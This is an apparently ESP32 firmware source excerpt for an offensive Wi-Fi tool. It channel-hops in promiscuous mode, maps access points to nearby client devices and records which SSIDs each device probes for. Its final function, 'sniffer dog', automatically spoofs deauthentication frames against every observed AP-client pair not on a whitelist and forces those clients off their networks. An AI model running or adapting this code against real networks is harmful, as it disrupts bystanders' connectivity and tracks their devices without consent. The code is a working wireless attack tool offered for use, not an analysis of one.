// === SNIFFER HELPER FUNCTIONS ===

static bool is_multicast_mac(const uint8_t *mac) {
    // IPv6 multicast: 33:33:xx:xx:xx:xx
    if (mac[0] == 0x33 && mac[1] == 0x33) {
        return true;
    }
    // IPv4 multicast: 01:00:5e:xx:xx:xx
    if (mac[0] == 0x01 && mac[1] == 0x00 && mac[2] == 0x5e) {
        return true;
    }
    // Broadcast: ff:ff:ff:ff:ff:ff
    if (mac[0] == 0xff && mac[1] == 0xff && mac[2] == 0xff &&
        mac[3] == 0xff && mac[4] == 0xff && mac[5] == 0xff) {
        return true;
    }
    // General multicast (first bit of first octet is 1)
    if (mac[0] & 0x01) {
        return true;
    }
    return false;
}

static bool is_broadcast_bssid(const uint8_t *bssid) {
    return (bssid[0] == 0xff && bssid[1] == 0xff && bssid[2] == 0xff &&
            bssid[3] == 0xff && bssid[4] == 0xff && bssid[5] == 0xff);
}

static bool is_own_device_mac(const uint8_t *mac) {
    // Get our own MAC address
    uint8_t own_mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, own_mac);
    
    if (memcmp(mac, own_mac, 6) == 0) {
        return true;
    }
    
    // Also check AP interface MAC
    esp_wifi_get_mac(WIFI_IF_AP, own_mac);
    if (memcmp(mac, own_mac, 6) == 0) {
        return true;
    }
    
    return false;
}


static void add_client_to_ap(int ap_index, const uint8_t *client_mac, int rssi) {
    static uint32_t add_client_counter = 0;
    add_client_counter++;
    
    if ((add_client_counter % 10) == 0) {
        //printf("ADD_CLIENT_HEARTBEAT: Call %lu, AP index %d\n", add_client_counter, ap_index);
    }
    
    if (ap_index < 0 || ap_index >= sniffer_ap_count) {
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] add_client_to_ap: Invalid AP index %d (max: %d)", ap_index, sniffer_ap_count);
        }
        return;
    }
    
    sniffer_ap_t *ap = &sniffer_aps[ap_index];
    
    // Check if client already exists
    for (int i = 0; i < ap->client_count; i++) {
        if (memcmp(ap->clients[i].mac, client_mac, 6) == 0) {
            // Update existing client
            ap->clients[i].rssi = rssi;
            ap->clients[i].last_seen = esp_timer_get_time() / 1000; // ms
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] add_client_to_ap: Updated existing client %02X:%02X:%02X:%02X:%02X:%02X in AP %s (RSSI: %d)", 
                           client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5], 
                           ap->ssid, rssi);
            }
            return;
        }
    }
    
    // Add new client if space available
    if (ap->client_count < MAX_CLIENTS_PER_AP) {
        int index = ap->client_count++;
        memcpy(ap->clients[index].mac, client_mac, 6);
        ap->clients[index].rssi = rssi;
        ap->clients[index].last_seen = esp_timer_get_time() / 1000; // ms
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] add_client_to_ap: Added NEW client %02X:%02X:%02X:%02X:%02X:%02X to AP %s (RSSI: %d, total clients: %d)", 
                       client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5], 
                       ap->ssid, rssi, ap->client_count);
        }
    } else {
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] add_client_to_ap: Cannot add client - AP %s is full (%d/%d clients)", 
                       ap->ssid, ap->client_count, MAX_CLIENTS_PER_AP);
        }
    }
}

static void sniffer_process_scan_results(void) {
    if (!g_scan_done || g_scan_count == 0) {
        return;
    }
    
    MY_LOG_INFO(TAG, "Processing %u scan results for sniffer...", g_scan_count);
    
    // Clear existing sniffer data
    sniffer_ap_count = 0;
    memset(sniffer_aps, 0, sizeof(sniffer_aps));
    
    // Copy scan results to sniffer structure
    for (int i = 0; i < g_scan_count && i < MAX_SNIFFER_APS; i++) {
        wifi_ap_record_t *scan_ap = &g_scan_results[i];
        sniffer_ap_t *sniffer_ap = &sniffer_aps[sniffer_ap_count++];
        
        memcpy(sniffer_ap->bssid, scan_ap->bssid, 6);
        strncpy(sniffer_ap->ssid, (char*)scan_ap->ssid, sizeof(sniffer_ap->ssid) - 1);
        sniffer_ap->ssid[sizeof(sniffer_ap->ssid) - 1] = '\0';
        sniffer_ap->channel = scan_ap->primary;
        sniffer_ap->authmode = scan_ap->authmode;
        sniffer_ap->rssi = scan_ap->rssi;
        sniffer_ap->client_count = 0;
        sniffer_ap->last_seen = esp_timer_get_time() / 1000; // ms
    }
    
    MY_LOG_INFO(TAG, "Initialized %d APs for sniffer monitoring", sniffer_ap_count);
}

static void sniffer_init_selected_networks(void) {
    if (g_selected_count == 0 || !g_scan_done) {
        MY_LOG_INFO(TAG, "Cannot initialize selected networks - no selection or scan data");
        return;
    }
    
    MY_LOG_INFO(TAG, "Initializing sniffer for %d selected networks...", g_selected_count);
    
    // Clear existing sniffer data
    sniffer_ap_count = 0;
    memset(sniffer_aps, 0, sizeof(sniffer_aps));
    
    // Clear channel list
    sniffer_selected_channels_count = 0;
    memset(sniffer_selected_channels, 0, sizeof(sniffer_selected_channels));
    
    // Copy selected networks to sniffer structure
    for (int i = 0; i < g_selected_count && sniffer_ap_count < MAX_SNIFFER_APS; i++) {
        int idx = g_selected_indices[i];
        
        if (idx < 0 || idx >= (int)g_scan_count) {
            MY_LOG_INFO(TAG, "Warning: Invalid selected index %d, skipping", idx);
            continue;
        }
        
        wifi_ap_record_t *scan_ap = &g_scan_results[idx];
        sniffer_ap_t *sniffer_ap = &sniffer_aps[sniffer_ap_count++];
        
        memcpy(sniffer_ap->bssid, scan_ap->bssid, 6);
        strncpy(sniffer_ap->ssid, (char*)scan_ap->ssid, sizeof(sniffer_ap->ssid) - 1);
        sniffer_ap->ssid[sizeof(sniffer_ap->ssid) - 1] = '\0';
        sniffer_ap->channel = scan_ap->primary;
        sniffer_ap->authmode = scan_ap->authmode;
        sniffer_ap->rssi = scan_ap->rssi;
        sniffer_ap->client_count = 0;
        sniffer_ap->last_seen = esp_timer_get_time() / 1000; // ms
        
        // Add channel to unique channel list
        bool channel_exists = false;
        for (int j = 0; j < sniffer_selected_channels_count; j++) {
            if (sniffer_selected_channels[j] == scan_ap->primary) {
                channel_exists = true;
                break;
            }
        }
        
        if (!channel_exists && sniffer_selected_channels_count < MAX_AP_CNT) {
            sniffer_selected_channels[sniffer_selected_channels_count++] = scan_ap->primary;
        }
        
        MY_LOG_INFO(TAG, "  [%d] SSID='%s' Ch=%d BSSID=%02x:%02x:%02x:%02x:%02x:%02x", 
                   i + 1, sniffer_ap->ssid, sniffer_ap->channel,
                   sniffer_ap->bssid[0], sniffer_ap->bssid[1], sniffer_ap->bssid[2],
                   sniffer_ap->bssid[3], sniffer_ap->bssid[4], sniffer_ap->bssid[5]);
    }
    
    MY_LOG_INFO(TAG, "Sniffer initialized: %d networks on %d unique channel(s)", 
               sniffer_ap_count, sniffer_selected_channels_count);
    
    // Log channels
    if (sniffer_selected_channels_count > 0) {
        char channel_list[128] = {0};
        int offset = 0;
        for (int i = 0; i < sniffer_selected_channels_count && offset < 120; i++) {
            offset += snprintf(channel_list + offset, sizeof(channel_list) - offset, 
                             "%d%s", sniffer_selected_channels[i], 
                             (i < sniffer_selected_channels_count - 1) ? ", " : "");
        }
        MY_LOG_INFO(TAG, "Channel hopping list: [%s]", channel_list);
    }
}

static void sniffer_channel_hop(void) {
    if (!sniffer_active || sniffer_scan_phase) {
        return;
    }
    
    // Check if we're in selected networks mode
    if (sniffer_selected_mode && sniffer_selected_channels_count > 0) {
        // Use selected channels only
        sniffer_current_channel = sniffer_selected_channels[sniffer_channel_index];
        
        sniffer_channel_index++;
        if (sniffer_channel_index >= sniffer_selected_channels_count) {
            sniffer_channel_index = 0;
        }
    } else {
        // Use dual-band channel hopping (like Marauder)
        sniffer_current_channel = dual_band_channels[sniffer_channel_index];
        
        sniffer_channel_index++;
        if (sniffer_channel_index >= dual_band_channels_count) {
            sniffer_channel_index = 0;
        }
    }
    
    esp_wifi_set_channel(sniffer_current_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_last_channel_hop = esp_timer_get_time() / 1000;
    
    // Optional: Log channel changes with band info (debug mode)
    #if 0
    const char* band = (sniffer_current_channel <= 14) ? "2.4GHz" : "5GHz";
    MY_LOG_INFO(TAG, "Sniffer: Hopped to channel %d (%s)", sniffer_current_channel, band);
    #endif
}

// Task that handles time-based channel hopping (independent of packet flow)
static void sniffer_channel_task(void *pvParameters) {
    while (sniffer_active) {
        vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms
        
        if (!sniffer_active || sniffer_scan_phase) {
            continue;
        }
        
        // Force channel hop if 250ms passed
        int64_t current_time = esp_timer_get_time() / 1000;
        bool time_expired = (current_time - sniffer_last_channel_hop >= sniffer_channel_hop_delay_ms);
        
        if (time_expired) {
            //MY_LOG_INFO(TAG, "Sniffer: Time-based channel hop (250ms expired)");
            sniffer_channel_hop();
        }
    }
    
    MY_LOG_INFO(TAG, "Sniffer channel task ending");
    vTaskDelete(NULL);
}

static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    sniffer_packet_counter++;
    
    if (!sniffer_active || sniffer_scan_phase) {
        return; // No debug logging here - too frequent
    }
    
    // Show packet count every 20 packets when debug is OFF
    if (!sniff_debug && (sniffer_packet_counter % 20) == 0) {
        printf("Sniffer packet count: %lu\n", sniffer_packet_counter);
    }
    
    // Perform packet-based channel hopping (10 packets OR time-based task will handle it)
    if ((sniffer_packet_counter % 10) == 0) {
        //MY_LOG_INFO(TAG, "Sniffer: Packet-based channel hop (10 packets)");
        sniffer_channel_hop();
    }
    
    // Throttle debug logging - only every 100th packet when debug is on
    bool should_debug = sniff_debug && ((sniffer_packet_counter - sniffer_last_debug_packet) >= 100);
    if (should_debug) {
        sniffer_last_debug_packet = sniffer_packet_counter;
        printf("DEBUG_CHECKPOINT: Processing packet %lu\n", sniffer_packet_counter);
    }
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (should_debug) {
        const char* type_str = (type == WIFI_PKT_MGMT) ? "MGMT" : 
                              (type == WIFI_PKT_DATA) ? "DATA" : 
                              (type == WIFI_PKT_CTRL) ? "CTRL" : "UNKNOWN";
        
        MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Type=%s, Len=%d, Ch=%d, RSSI=%d", 
                   sniffer_packet_counter, type_str, len, sniffer_current_channel, pkt->rx_ctrl.rssi);
        
        if (len >= 24) {
            MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Addr1=%02X:%02X:%02X:%02X:%02X:%02X, Addr2=%02X:%02X:%02X:%02X:%02X:%02X, Addr3=%02X:%02X:%02X:%02X:%02X:%02X",
                       sniffer_packet_counter,
                       frame[4], frame[5], frame[6], frame[7], frame[8], frame[9],
                       frame[10], frame[11], frame[12], frame[13], frame[14], frame[15],
                       frame[16], frame[17], frame[18], frame[19], frame[20], frame[21]);
        }
    }
    
    // Filter only MGMT and DATA packets (like Marauder)
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) {
        // Skip logging for non-MGMT/DATA packets - too frequent
        return;
    }
    
    if (len < 24) { // Minimum 802.11 header size
        return; // Skip logging - too frequent
    }
    
    // Skip broadcast packets ONLY for DATA packets
    // MGMT packets (beacons, probe requests) normally have broadcast destinations
    bool is_broadcast_dest = (frame[4] == 0xff && frame[5] == 0xff && frame[6] == 0xff &&
                             frame[7] == 0xff && frame[8] == 0xff && frame[9] == 0xff);
    
    if (is_broadcast_dest && type == WIFI_PKT_DATA) {
        return; // Skip logging - too frequent
    }
    
    // Parse 802.11 header (like Marauder)
    uint8_t frame_type = frame[0] & 0xFC;
    uint8_t to_ds = (frame[1] & 0x01) != 0;
    uint8_t from_ds = (frame[1] & 0x02) != 0;
    
    // Extract addresses based on 802.11 standard
    uint8_t *addr1 = (uint8_t *)&frame[4];   // Address 1
    uint8_t *addr2 = (uint8_t *)&frame[10];  // Address 2  
    uint8_t *addr3 = (uint8_t *)&frame[16];  // Address 3
    
    if (sniff_debug) {
        // Minimal debug logging to avoid blocking
        printf("PKT_%lu: %s T=%d F=%d\n", sniffer_packet_counter, 
               (type == WIFI_PKT_MGMT) ? "MGMT" : "DATA", to_ds, from_ds);
    }
    
    // Process MGMT packets for client detection (like Marauder)
    if (type == WIFI_PKT_MGMT) {
        if (should_debug) printf("DEBUG: Processing MGMT packet %lu\n", sniffer_packet_counter);
        
        uint8_t *client_mac = NULL;
        uint8_t *ap_mac = NULL;
        bool is_client_frame = false;
        
        switch (frame_type) {
            case 0x80: // Beacon - update AP info only
                ap_mac = addr2; // Source is AP
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Beacon from AP: %02X:%02X:%02X:%02X:%02X:%02X", 
                               sniffer_packet_counter, ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
                }
                // Update AP info if exists
                for (int i = 0; i < sniffer_ap_count; i++) {
                    if (memcmp(sniffer_aps[i].bssid, ap_mac, 6) == 0) {
                        sniffer_aps[i].last_seen = esp_timer_get_time() / 1000;
                        sniffer_aps[i].rssi = pkt->rx_ctrl.rssi;
                        break;
                    }
                }
                return; // Don't process beacons for client detection
                
            case 0x40: // Probe Request - client looking for networks
                client_mac = addr2; // Source is client
                is_client_frame = true;
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Probe Request from client: %02X:%02X:%02X:%02X:%02X:%02X", 
                               sniffer_packet_counter, client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5]);
                }
                break;
                
            case 0x00: // Association Request - client trying to connect to AP
                client_mac = addr2; // Source is client
                ap_mac = addr1;     // Destination is AP
                is_client_frame = true;
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Association Request from client %02X:%02X:%02X:%02X:%02X:%02X to AP %02X:%02X:%02X:%02X:%02X:%02X", 
                               sniffer_packet_counter, client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
                               ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
                }
                break;
                
            case 0xB0: // Authentication - client authenticating with AP
                client_mac = addr2; // Source is client
                ap_mac = addr1;     // Destination is AP
                is_client_frame = true;
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Authentication from client %02X:%02X:%02X:%02X:%02X:%02X to AP %02X:%02X:%02X:%02X:%02X:%02X", 
                               sniffer_packet_counter, client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
                               ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
                }
                break;
                
            default:
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - Other MGMT frame type 0x%02X", sniffer_packet_counter, frame_type);
                }
                return;
        }
        
        // Process client frames
        if (is_client_frame && client_mac) {
            // Skip multicast/broadcast client MAC
            if (is_multicast_mac(client_mac) || is_own_device_mac(client_mac)) {
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - multicast or own device MAC", sniffer_packet_counter);
                }
                return;
            }
            
            // For probe requests, extract SSID and store
            if (frame_type == 0x40) {
                // Parse probe request to extract SSID
                // Probe request format: MAC header (24 bytes) + Frame body
                // Frame body starts with fixed parameters, then tagged parameters
                // SSID is usually the first tagged parameter (Tag Number = 0)
                
                if (len > 24 && probe_request_count < MAX_PROBE_REQUESTS) {
                    const uint8_t *body = frame + 24; // Skip MAC header
                    int body_len = len - 24;
                    
                    char ssid[33] = {0};
                    bool ssid_found = false;
                    uint8_t ssid_length = 0;
                    
                    // Parse tagged parameters to find SSID (tag 0)
                    int offset = 0;
                    while (offset + 2 <= body_len) {
                        uint8_t tag_number = body[offset];
                        uint8_t tag_length = body[offset + 1];
                        
                        if (offset + 2 + tag_length > body_len) {
                            break; // Invalid tag
                        }
                        
                        if (tag_number == 0) { // SSID tag
                            ssid_length = tag_length;
                            if (tag_length > 0 && tag_length <= 32) {
                                memcpy(ssid, &body[offset + 2], tag_length);
                                ssid[tag_length] = '\0';
                                ssid_found = true;
                            } else if (tag_length == 0) {
                                strcpy(ssid, "<Broadcast>");
                                ssid_found = true;
                            }
                            break;
                        }
                        
                        offset += 2 + tag_length;
                    }
                    
                    // Store probe request if SSID found and not broadcast probe
                    if (ssid_found && ssid_length > 0) {
                        // Check if this MAC+SSID combination already exists
                        bool already_exists = false;
                        for (int i = 0; i < probe_request_count; i++) {
                            if (memcmp(probe_requests[i].mac, client_mac, 6) == 0 &&
                                strcmp(probe_requests[i].ssid, ssid) == 0) {
                                // Update existing entry
                                probe_requests[i].last_seen = esp_timer_get_time() / 1000;
                                probe_requests[i].rssi = pkt->rx_ctrl.rssi;
                                already_exists = true;
                                break;
                            }
                        }
                        
                        // Add new probe request if not exists
                        if (!already_exists) {
                            memcpy(probe_requests[probe_request_count].mac, client_mac, 6);
                            strncpy(probe_requests[probe_request_count].ssid, ssid, sizeof(probe_requests[probe_request_count].ssid) - 1);
                            probe_requests[probe_request_count].rssi = pkt->rx_ctrl.rssi;
                            probe_requests[probe_request_count].last_seen = esp_timer_get_time() / 1000;
                            probe_request_count++;
                            
                            if (sniff_debug) {
                                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Stored probe request for SSID '%s' from %02X:%02X:%02X:%02X:%02X:%02X", 
                                           sniffer_packet_counter, ssid,
                                           client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5]);
                            }
                        }
                    }
                }
                return; // Don't process probe requests for AP client association
            }
            
            // For association/auth requests, find or create the target AP
            if (ap_mac) {
                int ap_index = -1;
                for (int i = 0; i < sniffer_ap_count; i++) {
                    if (memcmp(sniffer_aps[i].bssid, ap_mac, 6) == 0) {
                        ap_index = i;
                        break;
                    }
                }
                
                // If AP not found, create it dynamically (only in normal mode)
                // In selected mode, only monitor pre-selected networks
                if (ap_index < 0 && !sniffer_selected_mode && sniffer_ap_count < MAX_SNIFFER_APS) {
                    ap_index = sniffer_ap_count++;
                    memcpy(sniffer_aps[ap_index].bssid, ap_mac, 6);
                    snprintf(sniffer_aps[ap_index].ssid, sizeof(sniffer_aps[ap_index].ssid), 
                            "MGMT_%02X%02X", ap_mac[4], ap_mac[5]);
                    sniffer_aps[ap_index].channel = sniffer_current_channel;
                    sniffer_aps[ap_index].authmode = WIFI_AUTH_OPEN;
                    sniffer_aps[ap_index].rssi = pkt->rx_ctrl.rssi;
                    sniffer_aps[ap_index].client_count = 0;
                    sniffer_aps[ap_index].last_seen = esp_timer_get_time() / 1000;
                    
                    if (sniff_debug) {
                        MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: CREATED new AP %s from MGMT frame", 
                                   sniffer_packet_counter, sniffer_aps[ap_index].ssid);
                    }
                }
                
                if (ap_index >= 0) {
                    if (sniff_debug) {
                        MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: ACCEPTED - Adding client %02X:%02X:%02X:%02X:%02X:%02X to AP %s", 
                                   sniffer_packet_counter, client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
                                   sniffer_aps[ap_index].ssid);
                    }
                    add_client_to_ap(ap_index, client_mac, pkt->rx_ctrl.rssi);
                } else {
                    if (sniff_debug) {
                        MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - AP list full, cannot create new AP", sniffer_packet_counter);
                    }
                }
            }
        }
        return;
    }
    
    // Process DATA packets using 802.11 ToDS/FromDS logic (like Marauder)
    if (type == WIFI_PKT_DATA) {
        if (should_debug) printf("DEBUG: Processing DATA packet %lu\n", sniffer_packet_counter);
        
        uint8_t *client_mac = NULL;
        uint8_t *ap_mac = NULL;
        
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Processing DATA packet, ToDS=%d, FromDS=%d", 
                       sniffer_packet_counter, to_ds, from_ds);
        }
        
        // Determine AP and client MAC based on ToDS/FromDS bits (802.11 standard)
        if (to_ds && !from_ds) {
            // STA -> AP: addr1=AP, addr2=STA, addr3=DA
            ap_mac = addr1;      // Destination is AP
            client_mac = addr2;  // Source is client
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: STA->AP direction", sniffer_packet_counter);
            }
        } else if (!to_ds && from_ds) {
            // AP -> STA: addr1=STA, addr2=AP, addr3=SA  
            ap_mac = addr2;      // Source is AP
            client_mac = addr1;  // Destination is client
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: AP->STA direction", sniffer_packet_counter);
            }
        } else if (!to_ds && !from_ds) {
            // IBSS (ad-hoc): addr1=DA, addr2=SA, addr3=BSSID
            ap_mac = addr3;      // BSSID
            client_mac = addr2;  // Source
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: IBSS direction", sniffer_packet_counter);
            }
        } else {
            // WDS (to_ds && from_ds) - skip for now
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - WDS frame (ToDS=1, FromDS=1)", sniffer_packet_counter);
            }
            return;
        }
        
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: AP MAC: %02X:%02X:%02X:%02X:%02X:%02X, Client MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
                       sniffer_packet_counter, 
                       ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
                       client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5]);
        }
        
        // Skip multicast/broadcast client MAC
        if (is_multicast_mac(client_mac)) {
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - client is multicast/broadcast", sniffer_packet_counter);
            }
            return;
        }
        
        // Skip our own device as client
        if (is_own_device_mac(client_mac)) {
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - client is our own device", sniffer_packet_counter);
            }
            return;
        }
        
        // Find the AP in our known list
        int ap_index = -1;
        if (should_debug) printf("DEBUG: Searching %d APs for match\n", sniffer_ap_count);
        
        for (int i = 0; i < sniffer_ap_count; i++) {
            if (memcmp(sniffer_aps[i].bssid, ap_mac, 6) == 0) {
                ap_index = i;
                if (should_debug) printf("DEBUG: Found AP match at index %d\n", i);
                break;
            }
        }
        
        // If AP not found, try to add it dynamically (only in normal mode)
        // In selected mode, only monitor pre-selected networks
        if (ap_index < 0 && !sniffer_selected_mode && sniffer_ap_count < MAX_SNIFFER_APS) {
            ap_index = sniffer_ap_count++;
            memcpy(sniffer_aps[ap_index].bssid, ap_mac, 6);
            snprintf(sniffer_aps[ap_index].ssid, sizeof(sniffer_aps[ap_index].ssid), 
                    "Unknown_%02X%02X", ap_mac[4], ap_mac[5]); // Use last 2 bytes for unique name
            sniffer_aps[ap_index].channel = sniffer_current_channel;
            sniffer_aps[ap_index].authmode = WIFI_AUTH_OPEN; // Unknown
            sniffer_aps[ap_index].rssi = pkt->rx_ctrl.rssi;
            sniffer_aps[ap_index].client_count = 0;
            sniffer_aps[ap_index].last_seen = esp_timer_get_time() / 1000;
            
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: CREATED new AP %s for BSSID %02X:%02X:%02X:%02X:%02X:%02X", 
                           sniffer_packet_counter, sniffer_aps[ap_index].ssid,
                           ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
            }
        }
        
        if (ap_index >= 0) {
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: ACCEPTED - Adding client %02X:%02X:%02X:%02X:%02X:%02X to AP %s", 
                           sniffer_packet_counter, client_mac[0], client_mac[1], client_mac[2], 
                           client_mac[3], client_mac[4], client_mac[5], sniffer_aps[ap_index].ssid);
            }
            add_client_to_ap(ap_index, client_mac, pkt->rx_ctrl.rssi);
        } else {
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - AP list full (%d/%d), cannot add new AP %02X:%02X:%02X:%02X:%02X:%02X", 
                           sniffer_packet_counter, sniffer_ap_count, MAX_SNIFFER_APS,
                           ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
            }
        }
    }
}

// === SNIFFER DOG HELPER FUNCTIONS ===

// Channel hopping for sniffer_dog
static void sniffer_dog_channel_hop(void) {
    if (!sniffer_dog_active) {
        return;
    }
    
    // Use dual-band channel hopping
    sniffer_dog_current_channel = dual_band_channels[sniffer_dog_channel_index];
    
    sniffer_dog_channel_index++;
    if (sniffer_dog_channel_index >= dual_band_channels_count) {
        sniffer_dog_channel_index = 0;
    }
    
    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
}

// Task that handles channel hopping for sniffer_dog
static void sniffer_dog_task(void *pvParameters) {
    (void)pvParameters;
    
    while (sniffer_dog_active) {
        vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms
        
        if (!sniffer_dog_active) {
            continue;
        }
        
        // Force channel hop if 250ms passed
        int64_t current_time = esp_timer_get_time() / 1000;
        bool time_expired = (current_time - sniffer_dog_last_channel_hop >= sniffer_channel_hop_delay_ms);
        
        if (time_expired) {
            sniffer_dog_channel_hop();
        }
    }
    
    MY_LOG_INFO(TAG, "Sniffer Dog channel task ending");
    sniffer_dog_task_handle = NULL;
    vTaskDelete(NULL);
}

// Promiscuous callback for sniffer_dog - captures AP-STA pairs and sends deauth
static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    static uint32_t deauth_sent_count = 0;
    
    if (!sniffer_dog_active) {
        return;
    }
    
    // Filter only MGMT and DATA packets
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) {
        return;
    }
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (len < 24) { // Minimum 802.11 header size
        return;
    }
    
    // Parse 802.11 header
    uint8_t frame_type = frame[0] & 0xFC;
    uint8_t to_ds = (frame[1] & 0x01) != 0;
    uint8_t from_ds = (frame[1] & 0x02) != 0;
    
    // Extract addresses
    uint8_t *addr1 = (uint8_t *)&frame[4];   // Address 1
    uint8_t *addr2 = (uint8_t *)&frame[10];  // Address 2  
    //uint8_t *addr3 = (uint8_t *)&frame[16];  // Address 3
    
    uint8_t *ap_mac = NULL;
    uint8_t *sta_mac = NULL;
    
    // Identify AP and STA based on frame type and DS bits
    if (type == WIFI_PKT_DATA) {
        // For DATA frames, use DS bits to determine direction
        if (to_ds && !from_ds) {
            // STA -> AP
            sta_mac = addr2;  // Source is STA
            ap_mac = addr1;   // Destination is AP (BSSID)
        } else if (!to_ds && from_ds) {
            // AP -> STA
            ap_mac = addr2;   // Source is AP (BSSID)
            sta_mac = addr1;  // Destination is STA
        } else if (to_ds && from_ds) {
            // WDS (Wireless Distribution System) - skip
            return;
        } else {
            // Ad-hoc or other - skip
            return;
        }
    } else if (type == WIFI_PKT_MGMT) {
        // For MGMT frames, analyze frame type
        switch (frame_type) {
            case 0x00: // Association Request
            case 0x20: // Reassociation Request
            case 0xB0: // Authentication
                sta_mac = addr2; // Source is STA
                ap_mac = addr1;  // Destination is AP
                break;
                
            case 0x10: // Association Response
            case 0x30: // Reassociation Response
                ap_mac = addr2;  // Source is AP
                sta_mac = addr1; // Destination is STA
                break;
                
            case 0x80: // Beacon
            case 0x40: // Probe Request
            case 0x50: // Probe Response
                // Skip - not AP-STA pairs
                return;
                
            default:
                // Unknown or not relevant
                return;
        }
    }
    
    // Validate AP and STA addresses
    if (!ap_mac || !sta_mac) {
        return;
    }
    
    // Skip broadcast/multicast addresses
    if (is_broadcast_bssid(ap_mac) || is_broadcast_bssid(sta_mac) ||
        is_multicast_mac(ap_mac) || is_multicast_mac(sta_mac) ||
        is_own_device_mac(ap_mac) || is_own_device_mac(sta_mac)) {
        return;
    }
    
    // Check if AP BSSID is whitelisted - skip if it is
    if (is_bssid_whitelisted(ap_mac)) {
        return; // Silently skip whitelisted networks
    }
    
    // We have a valid AP-STA pair! Send 5 deauth packets
    // Create deauth frame from AP to STA (not broadcast!)
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    
    // Set destination to specific STA (not broadcast!)
    memcpy(&deauth_frame[4], sta_mac, 6);
    // Set source to AP
    memcpy(&deauth_frame[10], ap_mac, 6);
    // Set BSSID to AP
    memcpy(&deauth_frame[16], ap_mac, 6);
    
    // Send deauth frame for more effective disconnection

    // Blue LED flash to indicate deauth sent
    (void)led_set_color(0, 0, 255); // Blue

    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
    deauth_sent_count++;
    
    (void)led_set_color(255, 0, 0); // Back to red
    
    // Log statistics for this AP-STA pair
    MY_LOG_INFO(TAG, "[SnifferDog #%lu] DEAUTH sent: AP=%02X:%02X:%02X:%02X:%02X:%02X -> STA=%02X:%02X:%02X:%02X:%02X:%02X (Ch=%d, RSSI=%d)",
               deauth_sent_count,
               ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5],
               sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5],
               sniffer_dog_current_channel, pkt->rx_ctrl.rssi);
}

